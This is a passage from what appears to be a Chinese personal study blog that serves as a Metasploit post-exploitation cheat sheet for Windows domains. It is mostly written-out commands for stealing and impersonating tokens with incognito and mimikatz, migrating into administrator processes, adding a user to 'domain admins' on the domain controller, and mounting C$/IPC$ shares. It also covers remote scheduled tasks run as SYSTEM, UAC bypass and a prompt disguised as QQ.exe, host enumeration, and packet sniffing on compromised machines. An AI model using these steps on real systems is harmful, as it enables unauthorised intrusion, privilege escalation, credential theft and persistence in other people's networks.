> 之后要求用户机那边输入用户名和密码

和上面那个一样

> use exploit/windows/local/ask
>
> set session 1
>
> run

### 令牌窃取

>以下的命令是进入控制肉鸡之后输入的
>
>![image-20220220140740957](D:\Code\pojo\Blog\BlogHexo\public\img\令牌-2.png)
>
>也就是上面图片的那个模式

use incognito

list_tokens -u(能看到的令牌数量因权限决定)

然后会显示类似如下的信息
![image-20220220140421802](D:\Code\pojo\Blog\BlogHexo\public\img\令牌-1.png)

上面的Delegation Tokens是可以登录的下面的是不可以登录的



假冒令牌:

impersonate_token (上面的可登录的用户如:TEST1\\\\user1)



**题外话**

load mimikatz

kerberos_ticket_list列出登录信息?

kerberos_ticket_use



ps查看进程

如果有管理员没退出,残留了一些进程我们尝试进入那个进程从而获取他的权限

操作方法如下:

migrate PID

> 当拿到域控管理员的时候我们可以添加一个用户
>
> add_user 用户名 密码 -h 域控服务器的ip地址

> 添加用户到组从而提权
>
> add_group_user "domain admins" 用户名 -h 域控制器的ip地址

==**下面的命令是Windows中使用的**==

当我们添加完毕之后如果域控的服务器开启着c盘的共享

我们使用

> net use \\\\域控的ip\\c$ "密码" /user:用户名

然后就可以访问到目标的c盘了,如果对方开启了135,445端口可是使用如下的命令

> net use \\\\域控的ip\\ipc$ "密码" /user:用户名

远程访问进程

>tasklist /S ip /U 用户名 /P 密码

设置计划任务

>at \\\\ip 时间(例如:9:51PM) cmd.exe "执行命令"
>
>schtasks /create /s IP地址 /tn test1 /sc onstart /tr c:/a.bat /ru system /f       (这条命令的意思是运行c下的a.bat)



### 后渗透

#### 权限提升

1.UAC需要用户身份认证的

2.使用绕过uac提权

3.寻找操作系统是否有本地溢出的漏洞



第一种方法

> use exploit/windows/local/ask
>
> set filename QQ.exe #设置文件名
>
> set sessions #查看获取用户的session号
>
> set session 7
>
> exploit #当用户点击确定之后便成功
>
> sessions -i 7
>
> getsystem



第二种方法

UAC绕过

>use exploit/windows/local/bypassuac
>
>set sessions
>
>set session 9
>
>sessions -i 9
>
>exploit
>
>getuid      #查看提权是否成功不成功的话使用getsystem尝试



第三种方法

查询Windows提权漏洞

例如ms16_016



#### 信息搜集

进入session之后

> run post/windows/gather/checkvm #检查是否是虚拟机
>
> 
>
> run post/windows/gather/forensics/enum_drives #获取驱动器
>
> 
>
> run post/windows/gather/enum_services #查看运行的服务
>
> 
>
> run post/windows/gather/enum_applications #列出安装的应用
>
> 
>
> run post/windows/gather/enum_share #查看是否存在共享
>
> 
>
> run post/windows/gather/dumplinks #搜集内网的其他信息
>
> 
>
> run post/windows/gather/enum_patches #查看存在的补丁
>
> 
>
> run scraper #自动获取信息(脚本)
>
> run winenum #获取Windows操作系统的信息(脚本)



**数据包获取**

![image-20220227134412878](D:\Code\pojo\Blog\BlogHexo\public\img\sniffer.png)

>load sniffer #加载sniffer
>
>help #查看获取的命令
>
>
>
>由于抓取的包会存在内存中而不是放入硬盘所以一般一次只能抓取5万个包,所以要经常来下载包
>
>使用sniffer_dump来获取信息      sniffer_dump 文件名
>
>然后使用wireshark来数据包的分析或者使用auxiliary/sniffer/psnuffle
>
>
>
>使用auxiliary/sniffer/psnuffle方式来解析
>
>use auxiliary/sniffer/psnuffle
>
>set pcapfile 文件位置
>
>
>
>或者使用packetrecorder 来获取数据包
>
>在session里 run packetrecorder [参数]
